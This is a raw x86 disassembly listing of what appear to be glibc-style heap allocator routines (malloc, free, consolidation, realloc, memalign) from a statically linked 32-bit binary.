mov ecx, dword [var_1ch]
mov edi, dword [eax + 4]
mov ecx, dword [ecx + 0xc]
and edi, 0xfffffff8
mov dword [var_28h], ecx
cmp dword [var_14h], 0x1ff
ja 0x8051dfd
mov edx, dword [var_24h]
cmp ecx, edx
je 0x8052164
cmp edi, dword [var_14h]
mov ecx, dword [var_28h]
mov edx, dword [var_10h]
mov eax, dword [var_24h]
mov dword [edx + 0x68], ecx
mov dword [ecx + 8], eax
je 0x8052154
cmp edi, 0x1ff
ja 0x80520ce
mov eax, dword [var_10h]
mov esi, edi
shr esi, 3
lea eax, [eax + esi*8 + 0x54]
mov ebx, dword [eax + 8]
mov dword [var_28h], eax
mov edx, esi
mov eax, 1
and esi, 0x1f
mov ecx, esi
sar edx, 5
shl eax, cl
mov ecx, dword [var_10h]
or dword [ecx + edx*4 + 0x45c], eax
mov eax, dword [var_1ch]
mov edx, dword [var_28h]
mov dword [eax + 8], ebx
mov dword [eax + 0xc], edx
mov dword [edx + 8], eax
mov dword [ebx + 0xc], eax
mov eax, dword [var_24h]
mov ecx, dword [ecx + 0x68]
cmp ecx, eax
mov dword [var_1ch], ecx
jne 0x8051dd7
cmp dword [var_14h], 0x1ff
jbe 0x8051e9d
mov edx, dword [var_18h]
mov ecx, dword [var_10h]
lea ebx, [ecx + edx*8 + 0x54]
mov eax, dword [ebx + 0xc]
cmp eax, ebx
mov dword [var_1ch], eax
je 0x8051e9d
mov eax, dword [ebx + 8]
mov edx, dword [var_14h]
cmp dword [eax + 4], edx
jae 0x8052043
inc dword [var_18h]
mov ecx, dword [var_10h]
mov esi, 1
mov edx, dword [var_18h]
and dword [var_18h], 0x1f
lea ebx, [ecx + edx*8 + 0x54]
shr edx, 5
mov eax, dword [ecx + edx*4 + 0x45c]
movzx ecx, byte [var_18h]
mov dword [var_28h], eax
mov eax, edx
shl esi, cl
shl eax, 8
mov ecx, dword [var_10h]
lea edi, [ecx + eax]
cmp esi, dword [var_28h]
ja 0x8051ee0
test esi, esi
jne 0x8051f09
lea esi, [esi]
inc edx
add edi, 0x100
cmp edx, 3
ja 0x8051fc5
mov eax, dword [var_10h]
mov eax, dword [eax + edx*4 + 0x45c]
test eax, eax
mov dword [var_28h], eax
je 0x8051ee0
lea ebx, [edi + 0x54]
mov esi, 1
test dword [var_28h], esi
jne 0x8051f1a
mov esi, esi
add ebx, 8
add esi, esi
test dword [var_28h], esi
je 0x8051f10
mov ecx, dword [ebx + 0xc]
cmp ecx, ebx
mov dword [var_1ch], ecx
jne 0x8051f42
mov eax, esi
mov ebx, dword [var_1ch]
add esi, esi
not eax
and dword [var_28h], eax
mov eax, dword [var_10h]
mov ecx, dword [var_28h]
add ebx, 8
mov dword [eax + edx*4 + 0x45c], ecx
jmp 0x8051ed1
mov eax, dword [var_1ch]
mov edi, dword [eax + 4]
mov edx, dword [eax + 0xc]
and edi, 0xfffffff8
mov dword [ebx + 0xc], edx
mov dword [edx + 8], ebx
mov esi, edi
sub esi, dword [var_14h]
cmp esi, 0xf
ja 0x8051f79
or dword [edi + eax + 4], 1
cmp dword [var_10h], 0x80aa360
je 0x8051da4
or dword [eax + 4], 4
jmp 0x8051da4
mov edx, dword [var_1ch]
mov ecx, dword [var_10h]
add edx, dword [var_14h]
mov eax, dword [var_24h]
cmp dword [var_14h], 0x1ff
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov dword [edx + 8], eax
mov dword [edx + 0xc], eax
ja 0x8051f9d
mov dword [ecx + 0x58], edx
or dword [var_14h], 5
cmp dword [var_10h], 0x80aa360
mov ecx, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esi + edx], esi
cmovne ecx, dword [var_14h]
mov dword [eax + 4], ecx
mov eax, esi
or eax, 1
mov dword [edx + 4], eax
jmp 0x8051da4
mov edx, dword [var_10h]
mov eax, dword [var_14h]
mov edx, dword [edx + 0x54]
add eax, 0x10
mov edi, dword [edx + 4]
mov dword [var_1ch], edx
and edi, 0xfffffff8
cmp edi, eax
jae 0x8052015
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
jne 0x8051ffd
mov dword [esp], eax
call fcn.08052430
mov edx, dword [var_14h]
shr edx, 3
mov dword [var_18h], edx
jmp 0x8051dc3
mov ecx, dword [var_10h]
mov eax, dword [var_14h]
mov dword [arg_ch], ecx
mov dword [arg_8h], eax
add esp, 0x24
pop ebx
pop esi
pop edi
leave
jmp 0x80509c0
add edx, dword [var_14h]
mov ecx, dword [var_10h]
sub edi, dword [var_14h]
mov eax, dword [var_20h]
or dword [var_14h], 5
cmp ecx, 0x80aa360
cmovne eax, dword [var_14h]
mov dword [ecx + 0x54], edx
mov ecx, dword [var_1ch]
or edi, 1
mov dword [ecx + 4], eax
mov dword [edx + 4], edi
jmp 0x8051d48
mov ecx, dword [var_1ch]
mov edi, dword [ecx + 4]
and edi, 0xfffffff8
cmp edi, edx
jae 0x8052064
mov eax, dword [var_1ch]
mov eax, dword [eax + 0xc]
mov edi, dword [eax + 4]
mov dword [var_1ch], eax
and edi, 0xfffffff8
cmp edi, dword [var_14h]
jb 0x8052050
mov edx, dword [var_1ch]
mov esi, edi
sub esi, dword [var_14h]
mov ebx, dword [edx + 8]
mov ecx, dword [edx + 0xc]
cmp dword [ebx + 0xc], edx
mov dword [var_28h], ecx
jne 0x805207f
cmp dword [ecx + 8], edx
je 0x805208c
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov eax, dword [var_28h]
cmp esi, 0xf
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
ja 0x80520a7
mov edx, dword [var_1ch]
or dword [edi + edx + 4], 1
jmp 0x8051d97
mov edx, dword [var_1ch]
mov ecx, dword [var_10h]
add edx, dword [var_14h]
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov eax, dword [var_24h]
or dword [var_14h], 5
cmp ecx, 0x80aa360
mov dword [edx + 8], eax
mov dword [edx + 0xc], eax
jmp 0x8051fa8
mov eax, edi
shr eax, 6
cmp eax, 0x20
lea esi, [eax + 0x38]
jbe 0x8052115
mov eax, edi
shr eax, 9
cmp eax, 0x14
lea esi, [eax + 0x5b]
jbe 0x8052115
mov eax, edi
shr eax, 0xc
cmp eax, 0xa
lea esi, [eax + 0x6e]
jbe 0x8052115
mov eax, edi
shr eax, 0xf
cmp eax, 4
lea esi, [eax + 0x77]
jbe 0x8052115
mov eax, edi
mov esi, 0x7e
shr eax, 0x12
lea edx, [eax + 0x7c]
cmp eax, 2
cmovbe esi, edx
mov edx, dword [var_10h]
lea edx, [edx + esi*8 + 0x54]
mov ebx, dword [edx + 8]
mov dword [var_28h], edx
cmp ebx, edx
je 0x8051e33
mov eax, dword [edx + 0xc]
or edi, 1
cmp edi, dword [eax + 4]
ja 0x805213c
mov ebx, edx
jmp 0x8051e30
cmp edi, dword [ebx + 4]
jae 0x8052149
mov ebx, dword [ebx + 8]
cmp edi, dword [ebx + 4]
jb 0x8052141
mov ecx, dword [ebx + 0xc]
mov dword [var_28h], ecx
jmp 0x8051e33
mov edx, dword [var_1ch]
mov ecx, dword [var_14h]
or dword [ecx + edx + 4], 1
jmp 0x8051d97
mov ecx, dword [var_10h]
cmp eax, dword [ecx + 0x58]
jne 0x8051dfd
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jbe 0x8051dfd
mov edx, dword [var_1ch]
mov esi, edi
add edx, dword [var_14h]
sub esi, dword [var_14h]
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov dword [ecx + 0x58], edx
jmp 0x80520b6
mov eax, dword [var_14h]
shr eax, 6
cmp eax, 0x20
ja 0x80521bc
add eax, 0x38
mov dword [var_18h], eax
and ecx, 1
jne 0x8051db1
mov eax, dword [var_10h]
mov dword [esp], eax
jmp 0x8051dac
mov eax, dword [var_14h]
shr eax, 9
cmp eax, 0x14
ja 0x80521cc
add eax, 0x5b
jmp 0x80521a5
mov eax, dword [var_14h]
shr eax, 0xc
cmp eax, 0xa
ja 0x80521dc
add eax, 0x6e
jmp 0x80521a5
mov eax, dword [var_14h]
shr eax, 0xf
cmp eax, 4
ja 0x80521ec
add eax, 0x77
jmp 0x80521a5
mov eax, dword [var_14h]
mov dword [var_18h], 0x7e
shr eax, 0x12
lea edx, [eax + 0x7c]
cmp eax, 2
cmova edx, dword [var_18h]
mov dword [var_18h], edx
jmp 0x80521a8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8051d4d
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], esi
mov eax, dword [arg_8h]
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_4h], edi
mov dword [var_10h], eax
test esi, esi
je 0x8052272
lea ecx, [esi - 8]
mov edx, dword [ecx + 4]
mov ebx, edx
and ebx, 0xfffffff8
mov eax, ebx
neg eax
cmp ecx, eax
ja 0x80523dd
mov edi, dword [var_10h_2]
mov eax, dword [edi + 0x28]
cmp ebx, eax
ja 0x8052280
shr ebx, 3
and eax, 0xfffffffe
lea edx, [edi + ebx*4]
mov dword [edi + 0x28], eax
mov eax, dword [edx + 0x24]
mov dword [ecx + 8], eax
mov dword [edx + 0x24], ecx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
test dl, 2
jne 0x80523b4
lea edi, [ebx + ecx]
mov eax, dword [edi + 4]
mov dword [var_18h], eax
and eax, 0xfffffff8
and edx, 1
mov dword [var_14h], eax
jne 0x80522c7
mov eax, dword [esi - 8]
sub ecx, eax
add ebx, eax
mov edx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [edx + 0xc], ecx
jne 0x80522b4
cmp dword [eax + 8], ecx
je 0x80522c1
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov edx, dword [var_10h_2]
cmp edi, dword [edx + 0x54]
je 0x80523a6
mov eax, dword [var_10h_2]
test byte [eax + edi + 4], 1
jne 0x8052397
mov edx, dword [edi + 8]
mov eax, dword [edi + 0xc]
cmp dword [edx + 0xc], edi
jne 0x80522b4
cmp dword [eax + 8], edi
jne 0x80522b4
add ebx, dword [var_10h_2]
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov eax, dword [var_ch_2]
mov dword [ebx + ecx], ebx
add eax, 0x5c
mov edx, dword [eax + 8]
mov dword [ecx + 0xc], eax
mov dword [ecx + 8], edx
mov dword [edx + 0xc], ecx
mov dword [eax + 8], ecx
mov eax, ebx
or eax, 1
mov dword [ecx + 4], eax
cmp ebx, 0xffff
jbe 0x8052272
mov eax, dword [var_10h_2]
test byte [eax + 0x28], 1
je 0x805238d
cmp dword [var_10h_2], 0x80aa360
je 0x8052358
mov edx, dword [var_ch_2]
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
mov edi, dword [var_4h_3]
mov eax, dword [edx + 0x54]
mov edx, dword [0x80aa7e4]
leave
and eax, 0xfff00000
jmp 0x804f7c0
mov eax, dword [0x80aa3b4]
mov eax, dword [eax + 4]
and eax, 0xfffffff8
cmp eax, dword [0x80aa7e0]
jb 0x8052272
mov dword [var_sp_8h], 0x80aa360
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov eax, dword [0x80aa7e4]
mov edi, dword [var_4h_2]
mov dword [var_sp_4h], eax
leave
jmp fcn.08050e70
mov dword [esp], eax
call fcn.08052430
jmp 0x805232f
and dword [var_14h], 0xfffffffe
mov edx, dword [var_14h]
mov dword [edi + 4], edx
jmp 0x80522fa
add ebx, dword [var_14h]
mov edi, dword [var_10h_2]
mov dword [edi + 0x54], ecx
jmp 0x8052312
mov edx, dword [esi - 8]
dec dword [0x80aa7ec]
lea eax, [edx + ebx]
sub ecx, edx
sub dword [0x80aa7fc], eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], ecx
mov edi, dword [var_4h_2]
leave
jmp fcn.08054780
mov eax, dword [0x80a951c]
test al, 1
jne 0x80523f0
test al, 2
je 0x8052272
jmp 0x8052424
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [var_sp_4h], str.free__:_invalid_pointer__p__n
mov dword [var_sp_8h], esi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x80523e6
call fcn.08062c50
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [var_sp_4h]
mov dword [var_10h_2], eax
mov edx, eax
mov eax, dword [eax + 0x28]
test eax, eax
je 0x8052551
mov ebx, dword [var_10h_2]
or eax, 1
mov dword [edx + 0x28], eax
shr eax, 3
add edx, 0x5c
mov dword [var_20h], edx
lea eax, [ebx + eax*4 + 0x24]
add ebx, 0x2c
mov dword [var_18h], eax
mov dword [var_14h], ebx
nop
lea esi, [esi]
mov eax, dword [var_14h]
mov ecx, dword [eax]
test ecx, ecx
je 0x805251c
mov dword [eax], 0
mov eax, dword [ecx + 4]
mov edx, dword [ecx + 8]
mov esi, eax
mov dword [var_1ch], edx
and esi, 0xfffffffa
lea edx, [esi + ecx]
mov edi, dword [edx + 4]
mov ebx, edi
and ebx, 0xfffffff8
test al, 1
mov dword [var_24h], ebx
jne 0x80524c7
mov eax, dword [ecx]
sub ecx, eax
add esi, eax
mov ebx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [ebx + 0xc], ecx
jne 0x8052563
cmp dword [eax + 8], ecx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_10h_2]
cmp edx, dword [eax + 0x54]
je 0x8052540
mov ebx, dword [var_24h]
test byte [ebx + edx + 4], 1
jne 0x8052534
add esi, ebx
mov eax, dword [edx + 0xc]
mov ebx, dword [edx + 8]
cmp dword [ebx + 0xc], edx
jne 0x8052563
cmp dword [eax + 8], edx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_20h]
mov ebx, dword [var_20h]
mov dword [esi + ecx], esi
mov edx, dword [eax + 8]
mov dword [eax + 8], ecx
mov eax, esi
or eax, 1
mov dword [ecx + 4], eax
mov dword [edx + 0xc], ecx
mov dword [ecx + 8], edx
mov dword [ecx + 0xc], ebx
mov ecx, dword [var_1ch]
test ecx, ecx
jne 0x8052483
mov eax, dword [var_14h]
add dword [var_14h], 4
cmp eax, dword [var_18h]
jne 0x8052470
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
and edi, 0xfffffffe
mov dword [edx + 4], edi
jmp 0x80524f1
lea esi, [esi]
add esi, dword [var_24h]
mov eax, dword [var_10h_2]
mov dword [eax + 0x54], ecx
or esi, 1
mov dword [ecx + 4], esi
jmp 0x8052511
mov edx, dword [var_10h_2]
mov dword [var_sp_4h], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp fcn.0804edc0
hlt
mov dword [esp], 0x7f
call fcn.08053d90
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x80528cc
test ebx, ebx
je 0x80528b7
cmp eax, 0xffffffdf
ja 0x80528a5
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
lea eax, [ebx - 8]
cmovb edx, dword [var_14h]
mov ecx, dword [eax + 4]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov edx, ecx
and edx, 0xfffffff8
test cl, 2
mov dword [var_1ch], edx
jne 0x80527c5
mov eax, dword [var_14h]
mov edi, edx
cmp edx, eax
jae 0x8052630
mov esi, dword [var_18h]
add esi, edx
mov edx, dword [var_10h]
cmp esi, dword [edx + 0x54]
je 0x8052777
mov eax, dword [esi + 4]
and eax, 0xfffffff8
test byte [eax + esi + 4], 1
jne 0x80526c0
mov edi, dword [var_1ch]
add edi, eax
cmp edi, dword [var_14h]
jb 0x80526c0
mov edx, dword [esi + 8]
mov eax, dword [esi + 0xc]
cmp dword [edx + 0xc], esi
jne 0x805261a
cmp dword [eax + 8], esi
je 0x8052627
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
lea esi, [esi]
mov ebx, edi
sub ebx, dword [var_14h]
cmp ebx, 0xf
ja 0x8052669
mov eax, ecx
and eax, 7
or eax, edi
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
or dword [edi + edx + 4], 1
mov eax, dword [var_18h]
add eax, 8
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, dword [var_18h]
add edx, dword [var_14h]
and eax, 7
or eax, dword [var_14h]
mov ecx, eax
or ecx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov ecx, dword [var_18h]
mov dword [ecx + 4], eax
mov ecx, ebx
mov eax, ebx
or eax, 1
or ecx, 5
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov dword [edx + 4], eax
or dword [ebx + edx + 4], 1
add edx, 8
mov dword [var_4h], edx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
jmp 0x805265b
lea esi, [esi]
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
mov dword [var_24h], eax
mov edx, dword [var_24h]
xor eax, eax
test edx, edx
je 0x8052661
mov eax, dword [var_24h]
sub eax, 8
mov edi, dword [eax + 4]
mov dword [var_20h], eax
and edi, 0xfffffff8
cmp eax, esi
je 0x8052769
mov ecx, dword [var_1ch]
sub ecx, 4
shr ecx, 2
cmp ecx, 9
jbe 0x8052721
cld
mov edi, dword [var_24h]
mov esi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_4h], ebx
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08052220
mov eax, dword [var_20h]
jmp 0x805265e
mov eax, dword [ebx]
mov edx, dword [var_24h]
cmp ecx, 4
mov dword [edx], eax
mov eax, dword [ebx + 4]
mov dword [edx + 4], eax
mov eax, dword [ebx + 8]
mov dword [edx + 8], eax
jbe 0x805270a
mov eax, dword [ebx + 0xc]
cmp ecx, 6
mov dword [edx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [edx + 0x10], eax
jbe 0x805270a
mov eax, dword [ebx + 0x14]
cmp ecx, 8
mov dword [edx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [edx + 0x18], eax
jbe 0x805270a
mov eax, dword [ebx + 0x1c]
mov dword [edx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [edx + 0x20], eax
jmp 0x805270a
mov edx, dword [var_18h]
add edi, dword [var_1ch]
mov ecx, dword [edx + 4]
jmp 0x8052630
mov eax, dword [esi + 4]
and eax, 0xfffffff8
add edi, eax
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jb 0x80526c0
mov eax, ecx
mov ecx, dword [var_18h]
and eax, 7
or eax, dword [var_14h]
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
sub edi, dword [var_14h]
mov edx, dword [var_10h]
mov dword [ecx + 4], eax
mov eax, ecx
add eax, dword [var_14h]
or edi, 1
mov dword [edx + 0x54], eax
mov dword [eax + 4], edi
mov eax, ebx
jmp 0x8052661
mov esi, dword [ebx - 8]
mov eax, dword [0x80aa7f8]
mov edx, dword [var_14h]
dec eax
add edx, esi
lea edi, [eax + edx + 4]
not eax
and edi, eax
mov eax, ebx
mov edx, edi
sub edx, esi
cmp dword [var_1ch], edx
mov dword [var_28h], edx
je 0x8052661
mov dword [var_ch], 1
mov dword [var_8h], edi
mov eax, dword [var_1ch]
add eax, esi
mov dword [var_4h], eax
sub dword [var_18h], esi
mov ecx, dword [var_18h]
mov dword [esp], ecx
call fcn.080548a0
cmp eax, 0xffffffff
je 0x8052849
or dword [var_28h], 2
add eax, esi
mov edx, dword [var_28h]
mov dword [var_20h], eax
mov dword [eax + 4], edx
mov eax, dword [0x80aa800]
mov edx, edi
sub edx, dword [var_1ch]
add edx, dword [0x80aa7fc]
cmp edx, eax
mov dword [0x80aa7fc], edx
cmova eax, edx
mov dword [0x80aa800], eax
jmp 0x8052719
mov eax, dword [var_14h]
mov dword [var_24h], ebx
add eax, 4
cmp dword [var_1ch], eax
jb 0x805285f
mov eax, dword [var_24h]
jmp 0x8052661
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
test eax, eax
mov dword [var_24h], eax
je 0x8052857
mov eax, dword [var_1ch]
mov dword [var_4h], ebx
sub eax, 8
mov dword [var_8h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08053770
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x8052857
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8052661
mov ecx, dword [var_10h]
mov dword [arg_ch], eax
mov dword [arg_8h], ecx
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x80528b0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
cmp ebx, 8
mov dword [var_10h], eax
jbe 0x8052a85
cmp ebx, 0xf
mov eax, 0x10
cmovbe ebx, eax
lea eax, [ebx - 1]
test eax, ebx
je 0x8052928
mov eax, 0x10
cmp eax, ebx
jae 0x8052926
lea esi, [esi]
add eax, eax
cmp eax, ebx
jb 0x8052920
mov ebx, eax
cmp edx, 0xffffffdf
ja 0x8052a73
lea eax, [edx + 0xb]
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
lea eax, [ebx + edx + 0x10]
mov dword [var_14h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08051cf0
mov edi, eax
xor eax, eax
test edi, edi
je 0x80529b8
lea eax, [edi - 8]
xor edx, edx
mov dword [var_18h], eax
mov eax, edi
div ebx
test edx, edx
je 0x8052a0e
mov edx, ebx
lea eax, [ebx + edi - 1]
neg edx
and eax, edx
lea esi, [eax - 8]
mov eax, esi
lea edx, [ebx + esi]
sub eax, dword [var_18h]
cmp eax, 0xf
cmovbe esi, edx
mov edx, dword [var_18h]
mov ebx, esi
sub ebx, dword [var_18h]
mov eax, dword [edx + 4]
mov ecx, eax
and ecx, 0xfffffff8
sub ecx, ebx
test al, 2
je 0x80529c0
add ebx, dword [edi - 8]
or ecx, 2
lea eax, [esi + 8]
mov dword [esi + 4], ecx
mov dword [esi], ebx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, ecx
or edx, 5
or eax, 1
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [esi + 4], eax
or dword [ecx + esi + 4], 1
mov eax, dword [edx + 4]
and eax, 7
or eax, ebx
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
mov dword [var_4h], edi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov dword [var_18h], esi
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
test al, 2
jne 0x8052a68
mov edx, eax
mov eax, dword [var_14h]
and edx, 0xfffffff8
add eax, 0x10
cmp edx, eax
jbe 0x8052a68
mov eax, edx
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, dword [var_14h]
mov edx, eax
or eax, 5
or edx, 1
cmp dword [var_10h], 0x80aa360
cmovne edx, eax
mov dword [ecx + 4], edx
add ecx, 8
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
and eax, 7
or eax, dword [var_14h]
mov dword [edx + 4], eax
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov eax, dword [var_18h]
add eax, 8
jmp 0x80529b8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x80529b8
mov dword [arg_ch], edx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_ch], 3
mov dword [var_4h], eax
mov eax, dword [arg_14h]
mov dword [var_10h], eax
lea eax, [var_4h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_18h]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_14h], edx
mov edx, dword [arg_14h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
je 0x8052d21
test ebx, ebx
je 0x8052cd5
mov esi, dword [var_14h]
mov eax, ebx
test esi, esi
je 0x8052c4e
mov dword [var_2ch], ebx
mov dword [var_28h], 0
test byte [var_1ch], 1
je 0x8052c91
mov edx, dword [var_18h]
mov dword [var_20h], 0x10
mov eax, dword [edx]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, dword [var_14h]
cmovb edx, dword [var_20h]
imul eax, edx
mov dword [var_20h], edx
mov dword [var_24h], eax
mov eax, dword [var_24h]
mov edx, dword [var_28h]
mov ebx, dword [0x80aa7f0]
mov dword [0x80aa7f0], 0
lea ecx, [edx + eax - 7]
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051cf0
mov dword [0x80aa7f0], ebx
mov edx, eax
xor eax, eax
test edx, edx
je 0x8052c4e
lea ebx, [edx - 8]
mov edi, dword [ebx + 4]
and edi, 0xfffffff8
test byte [var_1ch], 2
jne 0x8052c70
xor eax, eax
mov ecx, dword [var_2ch]
cmp dword [var_10h], 0x80aa360
setne al
test ecx, ecx
lea edx, [eax*4 + 1]
mov dword [var_30h], edx
je 0x8052c56
mov eax, dword [var_14h]
xor esi, esi
dec eax
mov dword [var_34h], eax
cmp esi, dword [var_34h]
mov edx, dword [var_2ch]
lea eax, [ebx + 8]
mov dword [edx + esi*4], eax
je 0x8052c42
mov ecx, dword [var_20h]
test ecx, ecx
jne 0x8052c33
mov edx, dword [var_18h]
mov ecx, 0x10
mov eax, dword [edx + esi*4]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovae ecx, edx
mov eax, dword [var_30h]
sub edi, ecx
inc esi
or eax, ecx
mov dword [ebx + 4], eax
add ebx, ecx
jmp 0x8052c05
or dword [var_30h], edi
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_24h]
sub edi, dword [var_24h]
or edi, dword [var_30h]
lea eax, [edx + ebx]
lea edx, [eax + 8]
mov dword [eax + 4], edi
mov dword [var_2ch], edx
mov edi, dword [var_24h]
jmp 0x8052bfc
mov eax, edi
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], 0
sub eax, 4
mov dword [var_8h], eax
call fcn.080536f0
jmp 0x8052bdf
xor esi, esi
mov dword [var_20h], 0
mov dword [var_24h], 0
cmp esi, dword [var_14h]
je 0x8052b91
lea esi, [esi]
mov edx, dword [var_18h]
mov eax, dword [edx + esi*4]
add eax, 0xb
cmp eax, 0xf
jbe 0x8052ccf
and eax, 0xfffffff8
add dword [var_24h], eax
inc esi
cmp esi, dword [var_14h]
jne 0x8052cb0
jmp 0x8052b91
add dword [var_24h], 0x10
jmp 0x8052cc4
mov ebx, dword [var_14h]
test ebx, ebx
je 0x8052d08
mov edx, dword [var_14h]
mov dword [var_28h], 0x10
mov dword [var_2ch], 0
lea eax, [edx*4 + 0xb]
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_28h]
mov dword [var_28h], edx
jmp 0x8052b60
mov edx, dword [var_10h]
mov dword [arg_ch], 0
mov dword [arg_8h], edx
add esp, 0x34
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [esp], eax
call fcn.08052430
jmp 0x8052b41
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052d5f
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [0x80aa7f8]
mov dword [var_sp_4h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
